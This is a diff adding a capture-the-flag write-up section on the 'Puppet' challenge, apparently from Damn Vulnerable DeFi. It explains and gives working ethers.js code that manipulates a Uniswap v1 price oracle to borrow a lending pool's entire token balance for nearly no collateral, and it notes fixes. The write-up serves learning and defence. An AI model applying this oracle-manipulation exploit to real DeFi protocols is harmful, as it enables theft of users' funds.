@@ -176,6 +176,46 @@ A fix here would be to have a separate government token, maybe one that requires
 The is the only challenge I wasn't able to solve. 
 
 ### Puppet
+The objective here is drain a lending pool.
+
+I liked this challenge because it was finally a break from flash loan exploits and required understanding actual uniswap code (v1 so it's no longer used). Getting experience with actual third party code instead of a theoretical/simplified version is extremely valuable. 
+
+There is actually a rounding error in \_computeOraclePrice() that I didn't notice until after I solved the challenge. If you catch it, it makes the overall exploit much easier to understand and pull off. 
+
+The idea here is that the lending pool issues loans required collateral depended on the price of the DVT token. We can manipulate the price of via the uniswap LP. First we sell off as much DVT as we can in order to tank the price. After that we can get a loan of all the DVT tokens in the lending pool while providing essentially no ETH as collateral. 
+
+We can do all of this without a smart contract if we don't mind it taking a few transactions. 
+```js
+const swapAmount = ethers.utils.parseEther('999');
+const deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;   // deadline
+
+await this.token.connect(attacker).approve(
+    this.uniswapExchange.address,
+    swapAmount
+);
+
+const val = await this.uniswapExchange.getTokenToEthInputPrice(
+  swapAmount,
+  { gasLimit: 1e6 }
+);
+
+const amount = await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+  swapAmount,
+  val,
+  deadline,
+);
+
+const steal = await this.token.balanceOf(this.lendingPool.address);
+const deposit =  await this.lendingPool.calculateDepositRequired(steal);
+
+await this.lendingPool.connect(attacker).borrow(steal, { value: deposit });
+```
+One tricky part was remembering to provide a gasLimit to the getTokenToEthInputPrice call. 
+
+Fixing the rounding error and not using Uniswap v1 are obvious fixes. 
+
+However, if a whale has a signifant number of tokens relative to the size of an LP this kind of manipulation is still possible. 
+
 ### Puppet v2
 ### Free rider
 ### Backdoor
